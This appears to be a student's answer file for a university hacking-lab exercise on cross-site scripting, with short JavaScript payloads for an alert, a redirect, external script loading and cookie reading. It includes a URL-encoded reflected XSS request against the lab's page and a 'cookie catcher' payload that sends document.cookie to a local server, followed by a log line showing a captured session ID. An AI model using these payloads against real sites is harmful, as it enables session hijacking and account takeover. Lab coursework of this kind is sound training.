<script></script>;
// a) Popup: Display a nice message to the client

alert('nice message');
// b) Redirect the client to some other website within 5 seconds

setTimeout(() => {
  window.open('https://google.com');
}, 5000);

// c) Try to execute JS code from a different web source within the web application

<script src="urltoscript.js"></script>;

// http://haklab-n1.cs.technikum-wien.at/xss/index.php?user=%3Cscript%3Ealert%28%27nice+message%27%29%3B%3C%2Fscript%3E&xss=on

// d) Figure out your current sesssion ID with the server

console.log(document.cookie);

// e) Research the term "Cookie Catcher" and create one of your own within your local Hacking Lab:

/* <script>location.href='http://localhost:8080/index.php?test='+document.cookie</script> */

// 172.17.0.1 - - [29/Apr/2021:15:54:41 +0000] "GET /index.php?test=PHPSESSID=ub26scu26j4qu2971e7nunll5r HTTP/1.1" 200 229 "http://haklab-n1.cs.technikum-wien.at/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
